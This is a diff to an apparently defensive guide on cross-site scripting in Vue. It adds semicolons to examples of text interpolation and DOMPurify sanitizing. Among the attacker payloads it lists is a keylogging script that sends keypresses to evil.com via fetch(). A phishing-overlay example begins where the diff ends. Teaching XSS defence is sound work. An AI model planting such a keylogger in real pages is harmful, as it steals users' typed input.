@@ -57,16 +57,16 @@ const userComment = ref(props.comment)
 </template>
 
 <script setup>
-import { computed } from 'vue'
-import DOMPurify from 'dompurify'
+import { computed } from 'vue';
+import DOMPurify from 'dompurify';
 
-const props = defineProps(['comment', 'trustedHtml'])
+const props = defineProps(['comment', 'trustedHtml']);
 
 // Option 1: Use text interpolation (recommended)
-const userComment = computed(() => props.comment)
+const userComment = computed(() => props.comment);
 
 // Option 2: Sanitize if raw HTML is truly needed
-const sanitizedContent = computed(() => DOMPurify.sanitize(props.trustedHtml))
+const sanitizedContent = computed(() => DOMPurify.sanitize(props.trustedHtml));
 </script>
 ```
 
@@ -86,7 +86,7 @@ const sanitizedContent = computed(() => DOMPurify.sanitize(props.trustedHtml))
 const staticLegalDisclaimer = `
   <p>Terms and conditions apply.</p>
   <a href="/legal">Read more</a>
-`
+`;
 </script>
 ```
 
@@ -101,8 +101,8 @@ Attackers can inject various payloads:
 <!-- Keylogging -->
 <script>
   document.onkeypress = function (e) {
-    fetch('https://evil.com?k=' + e.key)
-  }
+    fetch('https://evil.com?k=' + e.key);
+  };
 </script>
 
 <!-- Phishing overlay -->
